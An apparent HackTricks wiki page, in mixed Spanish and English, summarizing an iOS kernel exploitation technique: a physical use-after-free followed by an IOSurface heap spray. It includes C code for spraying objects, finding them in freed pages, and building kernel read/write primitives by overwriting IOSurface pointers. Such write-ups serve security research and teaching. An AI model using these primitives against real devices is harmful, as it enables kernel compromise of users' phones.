# iOS Physical Use-After-Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

This is a summary from the post from [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) moreover further information about exploit using this technique can be found in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

El espacio de direcciones de memoria virtual para procesos de usuario en iOS abarca desde 0x0 hasta 0x8000000000. Sin embargo, estas direcciones no se mapean directamente a memoria física. En su lugar, el kernel usa page tables para traducir direcciones virtuales a direcciones físicas reales.

#### Levels of Page Tables in iOS

Los page tables están organizados jerárquicamente en tres niveles:

1. L1 Page Table (Level 1):
* Cada entrada aquí representa un rango grande de memoria virtual.
* Cubre 0x1000000000 bytes (o 256 GB) de memoria virtual.
2. L2 Page Table (Level 2):
* Una entrada aquí representa una región más pequeña de memoria virtual, específicamente 0x2000000 bytes (32 MB).
* Una entrada L1 puede apuntar a una tabla L2 si no puede mapear toda la región por sí misma.
3. L3 Page Table (Level 3):
* Este es el nivel más fino, donde cada entrada mapea una sola página de memoria de 4 KB.
* Una entrada L2 puede apuntar a una tabla L3 si se necesita un control más granular.

#### Mapping Virtual to Physical Memory

* Direct Mapping (Block Mapping):
* Algunas entradas en un page table mapean directamente un rango de direcciones virtuales a un rango contiguo de direcciones físicas (como un atajo).
* Pointer to Child Page Table:
* Si se necesita un control más fino, una entrada en un nivel (por ejemplo, L1) puede apuntar a un child page table en el siguiente nivel (por ejemplo, L2).

#### Example: Mapping a Virtual Address

Supongamos que intentas acceder a la dirección virtual 0x1000000000:

1. L1 Table:
* El kernel comprueba la entrada del L1 page table correspondiente a esta dirección virtual. Si tiene un pointer to an L2 page table, va a esa tabla L2.
2. L2 Table:
* El kernel comprueba el L2 page table para un mapeo más detallado. Si esta entrada apunta a un L3 page table, procede allí.
3. L3 Table:
* El kernel busca la entrada final en L3, que apunta a la physical address de la página de memoria real.

#### Example of Address Mapping

Si escribes la physical address 0x800004000 en el primer índice de la L2 table, entonces:

* Las direcciones virtuales desde 0x1000000000 hasta 0x1002000000 se mapean a direcciones físicas desde 0x800004000 hasta 0x802004000.
* Esto es un block mapping a nivel L2.

Alternativamente, si la entrada L2 apunta a una tabla L3:

* Cada página de 4 KB en el rango virtual 0x1000000000 -> 0x1002000000 sería mapeada por entradas individuales en la L3 table.

### Physical use-after-free

Un Physical use-after-free (UAF) ocurre cuando:

1. Un proceso allocations some memory as readable and writable.
2. Los page tables se actualizan para mapear esta memoria a una physical address específica a la que el proceso puede acceder.
3. El proceso deallocates (frees) la memoria.
4. Sin embargo, debido a un bug, el kernel olvida eliminar el mapping de los page tables, aunque marca la memoria física correspondiente como libre.
5. El kernel puede entonces reallocar esta memoria física "liberada" para otros propósitos, como kernel data.
6. Dado que el mapping no fue eliminado, el proceso aún puede read y write en esta memoria física.

Esto significa que el proceso puede acceder a páginas de kernel memory, que podrían contener datos sensibles o estructuras, posibilitando que un atacante manipule kernel memory.

### IOSurface Heap Spray

Dado que el atacante no puede controlar qué páginas del kernel específicas serán asignadas a la memoria liberada, utiliza una técnica llamada heap spray:

1. El atacante crea una gran cantidad de IOSurface objects en kernel memory.
2. Cada IOSurface object contiene un magic value en uno de sus campos, lo que lo hace fácil de identificar.
3. Escanean las páginas liberadas para ver si alguno de estos IOSurface objects aterrizó en una página liberada.
4. Cuando encuentran un IOSurface object en una página liberada, pueden usarlo para read y write kernel memory.

More info about this in [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Be aware that iOS 16+ (A12+) devices bring hardware mitigations (like PPL or SPTM) that make physical UAF techniques far less viable.
> PPL enforces strict MMU protections on pages related to code signing, entitlements, and sensitive kernel data, so, even if a page gets reused, writes from userland or compromised kernel code to PPL-protected pages are blocked.
> Secure Page Table Monitor (SPTM) extends PPL by hardening page table updates themselves. It ensures that even privileged kernel code cannot silently remap freed pages or tamper with mappings without going through secure checks.
> KTRR (Kernel Text Read-Only Region), which locks down the kernel’s code section as read-only after boot. This prevents any runtime modifications to kernel code, closing off a major attack vector that physical UAF exploits often rely on.
> Moreover, `IOSurface` allocations are less predictable and harder to map into user-accessible regions, which makes the “magic value scanning” trick much less reliable. And `IOSurface` is now guarded by entitlements and sandbox restrictions.

### Step-by-Step Heap Spray Process

1. Spray IOSurface Objects: El atacante crea muchos IOSurface objects con un identificador especial ("magic value").
2. Scan Freed Pages: Comprueban si alguno de los objects ha sido asignado en una página liberada.
3. Read/Write Kernel Memory: Manipulando campos en el IOSurface object, obtienen la capacidad de realizar arbitrary reads and writes en kernel memory. Esto les permite:
* Usar un campo para read any 32-bit value en kernel memory.
* Usar otro campo para write 64-bit values, logrando un kernel read/write primitive estable.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Buscar objetos **`IOSurface`** en una página física liberada:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Logrando Kernel Read/Write con IOSurface

Después de lograr control sobre un objeto IOSurface en la memoria del kernel (mapeado a una página física liberada accesible desde el espacio de usuario), podemos usarlo para **operaciones arbitrarias de lectura y escritura en el kernel**.

**Key Fields in IOSurface**

El objeto IOSurface tiene dos campos cruciales:

1. **Use Count Pointer**: Permite una **lectura de 32 bits**.
2. **Indexed Timestamp Pointer**: Permite una **escritura de 64 bits**.

Al sobrescribir estos punteros, los redirigimos a direcciones arbitrarias en la memoria del kernel, habilitando capacidades de lectura/escritura.

#### Lectura de 32 bits en el kernel

Para realizar una lectura:

1. Sobrescribe el **use count pointer** para que apunte a la dirección objetivo menos un offset de 0x14 bytes.
2. Usa el método `get_use_count` para leer el valor en esa dirección.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Para realizar una escritura:

1. Sobrescribe el **indexed timestamp pointer** con la dirección objetivo.
2. Usa el método `set_indexed_timestamp` para escribir un valor de 64 bits.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Resumen del flujo del exploit

1. **Activar Physical Use-After-Free**: Las páginas liberadas están disponibles para su reutilización.
2. **Spray IOSurface Objects**: Reservar muchos objetos IOSurface con un "valor mágico" único en la memoria del kernel.
3. **Identificar IOSurface accesible**: Localiza un IOSurface en una página liberada que controlas.
4. **Abusar del Use-After-Free**: Modifica punteros en el objeto IOSurface para habilitar **kernel read/write** arbitrarios vía los métodos de IOSurface.

Con estos primitivos, el exploit proporciona **lecturas de 32 bits** controladas y **escrituras de 64 bits** en la memoria del kernel. Pasos adicionales del jailbreak podrían implicar primitivos de lectura/escritura más estables, que pueden requerir sortear protecciones adicionales (p. ej., PPL en dispositivos arm64e más nuevos).

{{#include ../../banners/hacktricks-training.md}}
